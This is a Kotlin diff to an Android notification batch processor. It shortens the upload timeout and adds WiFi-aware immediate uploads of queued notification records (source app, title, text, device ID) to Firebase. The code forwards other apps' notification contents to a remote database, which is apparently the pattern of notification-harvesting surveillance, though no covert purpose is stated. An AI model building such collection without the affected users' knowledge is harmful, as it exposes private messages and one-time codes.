@@ -6,6 +6,7 @@ import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import com.example.fast.config.AppConfig
+import com.example.fast.util.network.AdaptiveBatchConfig
 import com.google.firebase.Firebase
 import com.google.firebase.database.database
 import com.google.gson.Gson
@@ -27,8 +28,10 @@ import java.util.concurrent.ConcurrentLinkedQueue
  * This prevents Firebase overload when receiving many notifications.
  *
  * Features:
- * - Batches notifications: Uploads every 5 minutes OR when 100 notifications collected (default mode)
+ * - Batches notifications: Uploads every 30 seconds OR when 100 notifications collected (default mode)
  * - Real-time mode: Uploads each notification immediately (temporary mode)
+ * - WiFi-aware: Immediate upload when on strong WiFi connection
+ * - Adaptive batch timeout: Adjusts based on network conditions
  * - Processes in background thread
  * - Prevents Firebase overload (no one-by-one uploads in batch mode)
  * - Deduplication: Prevents uploading same notification twice (in-memory cache)
@@ -38,20 +41,23 @@ import java.util.concurrent.ConcurrentLinkedQueue
  * - Batch processing: Processes 100 notifications at a time, one batch at a time
  *
  * Sync Modes:
- * - BATCH (default): Collects notifications in queue, uploads when: 100 collected OR 5 minutes elapsed
+ * - BATCH (default): Collects notifications in queue, uploads when: 100 collected OR timeout elapsed
  * - REALTIME: Uploads each notification immediately to Firebase
+ * - AUTO (WiFi): Automatic immediate upload on strong WiFi
  *
  * Batch Strategy:
  * - Collects notifications in queue
- * - Uploads when: 100 notifications collected OR 5 minutes elapsed (whichever comes first)
+ * - Uploads when: batch size reached OR adaptive timeout elapsed (network-aware)
  * - All notifications uploaded in single JSON batch
  * - Notifications persisted to JSON file for offline recovery
+ *
+ * Optimization: Network-aware batch timeout (WiFi: 10s, Mobile: 30s, Poor: 60s)
  */
 object NotificationBatchProcessor {
 
     private const val TAG = "NotificationBatchProcessor"
-    private const val BATCH_SIZE = 100 // Upload when 100 notifications collected
-    private const val BATCH_TIMEOUT_MS = 5 * 60 * 1000L // 5 minutes max wait
+    private const val DEFAULT_BATCH_SIZE = 100 // Default upload when 100 notifications collected
+    private const val DEFAULT_BATCH_TIMEOUT_MS = 30 * 1000L // 30 seconds default (fallback)
     private const val MAX_CACHE_SIZE = 1000 // Keep last 1000 notification hashes in memory
     private const val STORAGE_FILE_NAME = "queued_notifications.json" // JSON file for persistent storage
 
@@ -212,6 +218,11 @@ object NotificationBatchProcessor {
     /**
      * Add notification to batch queue with in-memory deduplication check
      *
+     * Network-Aware Behavior:
+     * - Strong WiFi: Upload immediately (bypass batching)
+     * - Weak WiFi/Mobile: Use adaptive batch timeout
+     * - Offline: Queue only, upload when network available
+     *
      * @param context Application context
      * @param packageName Package name of the app that sent notification
      * @param title Notification title
@@ -235,10 +246,17 @@ object NotificationBatchProcessor {
             return
         }
 
-        // Check sync mode
+        // Check sync mode and network conditions
         synchronized(processingLock) {
             if (syncMode == SyncMode.REALTIME) {
                 // Real-time mode: Upload immediately
+                uploadNotificationImmediately(context, packageName, title, text, timestamp, notificationHash, extra)
+                return
+            }
+
+            // Check if we should upload immediately on WiFi
+            if (AdaptiveBatchConfig.shouldUploadImmediately(context)) {
+                Log.d(TAG, "Strong WiFi detected - uploading notification immediately")
                 uploadNotificationImmediately(context, packageName, title, text, timestamp, notificationHash, extra)
                 return
             }
@@ -261,6 +279,10 @@ object NotificationBatchProcessor {
         // Save to persistent storage
         saveToStorage(context)
 
+        // Get adaptive batch configuration
+        val batchConfig = AdaptiveBatchConfig.getConfig(context)
+        val adaptiveBatchSize = batchConfig.maxBatchSize
+
         // Check if we're currently processing a batch
         synchronized(processingLock) {
             if (isProcessing) {
@@ -270,14 +292,14 @@ object NotificationBatchProcessor {
                 return
             }
 
-            // Schedule batch processing if not already scheduled
+            // Schedule batch processing if not already scheduled (with adaptive timeout)
             if (batchTimer == null) {
-                scheduleBatchProcessing(context)
+                scheduleBatchProcessing(context, batchConfig.batchTimeoutMs)
             }
 
-            // Check if batch size reached (100 notifications)
-            if (notificationQueue.size >= BATCH_SIZE) {
-                Log.d(TAG, "Batch size reached ($BATCH_SIZE), triggering immediate batch upload (newest first)")
+            // Check if batch size reached (adaptive based on network)
+            if (notificationQueue.size >= adaptiveBatchSize) {
+                Log.d(TAG, "Batch size reached ($adaptiveBatchSize), triggering immediate batch upload (newest first)")
                 processBatch(context)
             }
         }
@@ -450,21 +472,27 @@ object NotificationBatchProcessor {
     }
 
     /**
-     * Schedule batch processing with timeout (5 minutes)
+     * Schedule batch processing with adaptive timeout
+     *
+     * @param context Application context
+     * @param timeoutMs Timeout in milliseconds (adaptive based on network)
      */
-    private fun scheduleBatchProcessing(context: Context) {
+    private fun scheduleBatchProcessing(context: Context, timeoutMs: Long = DEFAULT_BATCH_TIMEOUT_MS) {
+        // Cancel existing timer if any
+        batchTimer?.let { handler.removeCallbacks(it) }
+
         batchTimer = Runnable {
             synchronized(processingLock) {
                 if (!isProcessing && notificationQueue.isNotEmpty()) {
-                    Log.d(TAG, "Batch timeout reached (${BATCH_TIMEOUT_MS / 1000}s), processing batch")
+                    Log.d(TAG, "Batch timeout reached (${timeoutMs / 1000}s), processing batch")
                     processBatch(context)
                 }
                 batchTimer = null
             }
         }
 
-        handler.postDelayed(batchTimer!!, BATCH_TIMEOUT_MS)
-        Log.d(TAG, "Scheduled batch processing in ${BATCH_TIMEOUT_MS / 1000} seconds")
+        handler.postDelayed(batchTimer!!, timeoutMs)
+        Log.d(TAG, "Scheduled batch processing in ${timeoutMs / 1000} seconds (adaptive)")
     }
 
     /**
@@ -515,16 +543,16 @@ object NotificationBatchProcessor {
                 allNotifications.sortByDescending { it.timestamp }
 
                 // Take the first 100 notifications (newest ones)
-                val notificationsToProcess = allNotifications.take(BATCH_SIZE)
+                val notificationsToProcess = allNotifications.take(DEFAULT_BATCH_SIZE)
 
                 // Put remaining notifications back in queue (will be processed in next batch)
-                allNotifications.drop(BATCH_SIZE).forEach { notification ->
+                allNotifications.drop(DEFAULT_BATCH_SIZE).forEach { notification ->
                     notificationQueue.offer(notification)
                 }
 
                 Log.d(TAG, "🔄 Processing batch of ${notificationsToProcess.size} notifications (newest first priority)")
-                if (allNotifications.size > BATCH_SIZE) {
-                    Log.d(TAG, "📦 ${allNotifications.size - BATCH_SIZE} notifications remaining for next batch")
+                if (allNotifications.size > DEFAULT_BATCH_SIZE) {
+                    Log.d(TAG, "📦 ${allNotifications.size - DEFAULT_BATCH_SIZE} notifications remaining for next batch")
                 }
 
                 // Get device ID
